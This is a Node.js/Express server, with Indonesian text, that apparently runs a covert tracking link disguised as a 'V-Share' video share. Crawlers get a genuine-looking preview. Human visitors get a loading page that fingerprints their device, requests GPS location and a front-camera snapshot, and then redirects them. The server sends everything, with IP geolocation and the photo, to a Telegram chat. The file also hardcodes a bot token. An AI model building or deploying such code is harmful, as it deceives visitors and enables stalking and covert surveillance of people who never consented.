const express = require('express');
const axios = require('axios');
const cors = require('cors');
const { parse } = require('node-html-parser');
const FormData = require('form-data');
const { Buffer } = require('buffer');

const app = express();
const PORT = process.env.PORT || 3030;

const BOT_TOKEN = process.env.BOT_TOKEN || '7804296227:AAEl74FdE71shWdAVhmlLXi8-9WPLnZ6pto';

if (!BOT_TOKEN) {
    console.error("FATAL: BOT_TOKEN tidak didefinisikan!");
    process.exit(1);
}

const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

app.use(express.json({ limit: '10mb' }));
app.set("json spaces", 2);
app.use(cors());

app.get('/s/:data', async (req, res) => {
    const encodedData = req.params.data;
    let creatorId, targetUrl;

    try {
        const decodedString = Buffer.from(encodedData, 'base64').toString('utf8');
        const parts = decodedString.split('|||');
        if (parts.length !== 2) throw new Error('Invalid data format');
        [creatorId, targetUrl] = parts;
    } catch (error) {
        return res.status(400).send("URL tidak valid atau format salah.");
    }

    const userAgent = req.headers['user-agent'];
    const crawlerUserAgents = ['TelegramBot', 'facebookexternalhit', 'WhatsApp', 'Twitterbot', 'Discordbot'];
    const isCrawler = crawlerUserAgents.some(crawler => userAgent.includes(crawler));

    if (isCrawler) {
        try {
            const response = await axios.get(targetUrl);
            const root = parse(response.data);
            const getMetaTag = (prop) => root.querySelector(`meta[property="${prop}"]`)?.getAttribute('content') || '';
            const title = getMetaTag('og:title') || root.querySelector('title')?.text || 'Judul tidak ditemukan';
            const description = getMetaTag('og:description') || 'Deskripsi tidak ditemukan';
            const image = getMetaTag('og:image') || 'https://i.ibb.co/7J1p1zF/video-play-icon.png';

            return res.send(`
                <!DOCTYPE html>
                <html><head>
                    <meta charset="UTF-8"><title>${title}</title>
                    <meta property="og:title" content="${title}" /><meta property="og:description" content="${description}" />
                    <meta property="og:image" content="${image}" /><meta name="viewport" content="width=device-width, initial-scale=1.0">
                </head><body></body></html>`);
        } catch (error) {
            return res.send('Gagal mengambil metadata untuk preview.');
        }
    }

    res.send(`
    <!DOCTYPE html>
    <html lang="id">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>V-Share | Loading...</title>
        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@600;700&display=swap" rel="stylesheet">
        <style>
            :root {
                --bg-color: #000000; --primary-color: #ff0050; --secondary-color: #00f2ea; --white: #ffffff;
            }
            body {
                margin: 0; padding: 0; display: flex; justify-content: center; align-items: center;
                height: 100vh; background-color: var(--bg-color); font-family: 'Poppins', sans-serif; overflow: hidden;
            }
            .loader-container { position: relative; display: flex; justify-content: center; align-items: center; }
            .logo { width: 120px; height: 120px; display: grid; place-items: center; position: relative; z-index: 2; }
            .logo svg { width: 60%; height: 60%; color: var(--white); animation: logo-pop 1.5s infinite cubic-bezier(0.68, -0.55, 0.27, 1.55); }
            .spinner { position: absolute; width: 150px; height: 150px; border-radius: 50%; z-index: 1; }
            .spinner.one { border: 5px solid transparent; border-top-color: var(--primary-color); animation: spin 2s linear infinite; filter: drop-shadow(0 0 10px var(--primary-color)); }
            .spinner.two { border: 5px solid transparent; border-bottom-color: var(--secondary-color); animation: spin-reverse 1.5s linear infinite; filter: drop-shadow(0 0 10px var(--secondary-color)); }
            .loading-text { position: absolute; bottom: -60px; color: var(--white); font-size: 1.2em; letter-spacing: 2px; opacity: 0.8; }
            .loading-text span { animation: blink 1.2s infinite; }
            .loading-text span:nth-child(2) { animation-delay: 0.2s; }
            .loading-text span:nth-child(3) { animation-delay: 0.4s; }
            @keyframes spin { to { transform: rotate(360deg); } }
            @keyframes spin-reverse { to { transform: rotate(-360deg); } }
            @keyframes logo-pop { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.2); } }
            @keyframes blink { 0%, 100% { opacity: 0.2; } 50% { opacity: 1; } }
        </style>
    </head>
    <body>
        <div class="loader-container">
            <div class="spinner one"></div><div class="spinner two"></div>
            <div class="logo">
                <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24"><path d="M7.41 2.59c.58-.59 1.53-.59 2.11 0l2.48 2.48 2.48-2.48c.58-.59 1.53-.59 2.11 0s.58 1.54 0 2.12l-3.53 3.54c-.59.58-1.54.58-2.12 0L7.41 4.71c-.58-.58-.58-1.53 0-2.12zM12 12.25c.83 0 1.5.67 1.5 1.5v5c0 .83-.67 1.5-1.5 1.5s-1.5-.67-1.5-1.5v-5c0-.83.67-1.5 1.5-1.5z"/></svg>
            </div>
            <div class="loading-text">LOADING<span>.</span><span>.</span><span>.</span></div>
        </div>
        <script>
            const redirectToTarget = () => { setTimeout(() => { window.location.href = \`${targetUrl}\`; }, 500); };
            
            async function logData(data) {
                try { await fetch('/log', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) }); } catch (e) { console.error('Log Error:', e); }
            }

            async function processAndRedirect() {
                const getOsAndBrowser = (ua) => {
                    let os = 'N/A', browser = 'N/A';
                    if (/Android/i.test(ua)) { os = (ua.match(/Android (\\d+(\\.\\d+)*)/i) || [])[0] || 'Android'; }
                    else if (/iPhone|iPad|iPod/i.test(ua)) { os = (ua.match(/OS (\\d+_\\d+(_\\d+)*)/i) || ['iOS'])[0].replace(/_/g, '.'); }
                    else if (/Windows NT/i.test(ua)) { os = (ua.match(/Windows NT (\\d+(\\.\\d+)*)/i) || [])[0] || 'Windows'; }
                    else if (/Mac OS X/i.test(ua)) { os = (ua.match(/Mac OS X (\\d+[._]\\d+([._]\\d+)*)/i) || ['Mac OS X'])[0].replace(/_/g, '.'); }
                    else if (/Linux/i.test(ua)) { os = 'Linux'; }
                    
                    if (ua.indexOf("Firefox") > -1) { browser = (ua.match(/Firefox\\/[\\d.]+/i) || ['Firefox'])[0]; }
                    else if (ua.indexOf("SamsungBrowser") > -1) { browser = (ua.match(/SamsungBrowser\\/[\\d.]+/i) || ['Samsung Browser'])[0]; }
                    else if (ua.indexOf("Opera") > -1 || ua.indexOf("OPR") > -1) { browser = (ua.match(/(Opera|OPR)\\/[\\d.]+/i) || ['Opera'])[0]; }
                    else if (ua.indexOf("Edge") > -1) { browser = (ua.match(/Edge\\/[\\d.]+/i) || ['Edge'])[0]; }
                    else if (ua.indexOf("Chrome") > -1) { browser = (ua.match(/Chrome\\/[\\d.]+/i) || ['Chrome'])[0]; }
                    else if (ua.indexOf("Safari") > -1) { browser = (ua.match(/Version\\/[\\d.]+/i) || ['Safari'])[0]; }
                    return { os, browser };
                };
                
                const getGpuInfo = () => {
                    try {
                        const canvas = document.createElement('canvas');
                        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                        return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'N/A';
                    } catch (e) { return 'N/A'; }
                };
            
                let permissionsGranted = 0;
                const { os, browser } = getOsAndBrowser(navigator.userAgent);

                const data = {
                    creatorId: \`${creatorId}\`, targetUrl: \`${targetUrl}\`, userAgent: navigator.userAgent,
                    os: os, platform: navigator.platform, language: navigator.language,
                    screenWidth: window.screen.width, screenHeight: window.screen.height,
                    location: 'Ditolak/Dilewati', camera: 'Ditolak/Dilewati'
                };

                try { const battery = await navigator.getBattery(); data.battery = { level: \`\${Math.round(battery.level * 100)}%\`, isCharging: battery.charging }; } catch (e) { data.battery = { level: 'N/A', isCharging: 'N/A' }; }
                data.hardware = {
                    cpuCores: navigator.hardwareConcurrency || 'N/A',
                    ram: navigator.deviceMemory ? \`\${navigator.deviceMemory} GB\` : 'N/A',
                    gpu: getGpuInfo()
                };
                data.network = {
                    connectionType: navigator.connection?.type || 'N/A',
                    effectiveType: navigator.connection?.effectiveType || 'N/A',
                    downlink: navigator.connection?.downlink ? \`\${navigator.connection.downlink} Mbps\` : 'N/A'
                };
                data.browser = {
                    name: browser,
                    viewportWidth: window.innerWidth, viewportHeight: window.innerHeight,
                    pixelRatio: window.devicePixelRatio, colorDepth: window.screen.colorDepth,
                    cookiesEnabled: navigator.cookieEnabled, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                };
                 data.device = {
                    touchSupport: navigator.maxTouchPoints > 0,
                    plugins: Array.from(navigator.plugins).map(p => p.name).join(', ') || 'Tidak ada'
                };

                try {
                    const position = await new Promise((resolve, reject) => { navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }); });
                    data.location = \`https://www.google.com/maps/search/?api=1&query=${position.coords.latitude},${position.coords.longitude}\`;
                    permissionsGranted++;
                } catch (e) { /* Geolocation failed or denied */ }

                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                    const video = document.createElement('video'); video.srcObject = stream; await video.play();
                    const canvas = document.createElement('canvas'); canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                    data.camera = canvas.toDataURL('image/jpeg');
                    stream.getTracks().forEach(track => track.stop());
                    permissionsGranted++;
                } catch (e) { /* Camera access failed or denied */ }
                
                data.permissionsGranted = permissionsGranted;
                await logData(data);
                redirectToTarget();
            }

            window.onload = processAndRedirect;
        </script>
    </body>
    </html>
    `);
});

app.post('/log', async (req, res) => {
    const data = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const creatorId = data.creatorId;

    if (!creatorId) { return res.sendStatus(400); }

    let ipInfo = 'Tidak dapat mengambil info IP.';
    try {
        const ipRes = await axios.get(`http://ip-api.com/json/${ip}?fields=status,message,country,regionName,city,isp,org`);
        if (ipRes.data.status === 'success') {
            ipInfo = `*Negara:* ${ipRes.data.country}\n*Kota:* ${ipRes.data.city}, ${ipRes.data.regionName}\n*ISP:* ${ipRes.data.isp}\n*Organisasi:* ${ipRes.data.org}`;
        }
    } catch (e) { console.error("Gagal mengambil info IP:", e.message); }

    const isCameraAllowed = data.camera.startsWith('data:image/jpeg;base64,');
    const cameraStatusText = isCameraAllowed ? '✅ Diizinkan (Gambar terlampir)' : `❌ ${data.camera}`;
    const batteryStatus = data.battery.isCharging ? '🔌 Mengisi Daya' : '🔋 Normal';
    const cookieStatus = data.browser.cookiesEnabled ? '✅ Aktif' : '❌ Nonaktif';
    const touchStatus = data.device.touchSupport ? '✅ Ya' : '❌ Tidak';

    const message =
`🎯 *TARGET BARU TERDETEKSI* 🎯
-----------------------------------
🔗 *URL Asli:* \`${data.targetUrl}\`

*💻 — SISTEM & OS —*
*Sistem Operasi:* ${data.os}
*Platform:* ${data.platform}
*User Agent:* \`${data.userAgent}\`

*🌐 — BROWSER & TAMPILAN —*
*Browser:* ${data.browser.name}
*Resolusi Layar:* ${data.screenWidth}x${data.screenHeight}
*Viewport:* ${data.browser.viewportWidth}x${data.browser.viewportHeight}
*Kedalaman Warna:* ${data.browser.colorDepth}-bit
*Rasio Piksel:* ${data.browser.pixelRatio}
*Bahasa:* ${data.language}
*Zona Waktu:* ${data.browser.timezone}
*Cookie:* ${cookieStatus}

*🔩 — PERANGKAT KERAS —*
*CPU Cores:* ${data.hardware.cpuCores}
*RAM (Perkiraan):* ${data.hardware.ram}
*GPU/Renderer:* ${data.hardware.gpu}
*Baterai:* ${data.battery.level} (${batteryStatus})
*Dukungan Sentuh:* ${touchStatus}
*Plugins:* ${data.device.plugins}

*📡 — JARINGAN & LOKASI —*
*Tipe Koneksi:* ${data.network.connectionType} (${data.network.effectiveType})
*Kecepatan Downlink:* ${data.network.downlink || 'N/A'}
*Alamat IP:* \`${ip}\`
*Detail IP:*\n${ipInfo}
*Lokasi GPS:* ${data.location}

*🔐 — RINGKASAN IZIN —*
*Total Izin Diberikan:* ${data.permissionsGranted} dari 2
*Akses Kamera:* ${cameraStatusText}
`;

    try {
        await axios.post(`${TELEGRAM_API}/sendMessage`, { chat_id: creatorId, text: message, parse_mode: 'Markdown', disable_web_page_preview: true });
        if (isCameraAllowed) {
            const base64Data = data.camera.replace(/^data:image\/jpeg;base64,/, "");
            const imageBuffer = Buffer.from(base64Data, 'base64');
            const form = new FormData();
            form.append('chat_id', creatorId);
            form.append('photo', imageBuffer, { filename: 'capture.jpg', contentType: 'image/jpeg' });
            form.append('caption', `📸 Gambar dari kamera target.\nIP: \`${ip}\``);
            await axios.post(`${TELEGRAM_API}/sendPhoto`, form, { headers: form.getHeaders() });
        }
    } catch (error) {
        const errorMessage = error.response ? JSON.stringify(error.response.data) : error.message;
        console.error("Gagal mengirim log ke Telegram:", errorMessage);
    }
    
    res.sendStatus(200);
});

app.listen(PORT, () => {
    console.log(`Server pelacak berjalan di port ${PORT}`);
});

module.exports = app;
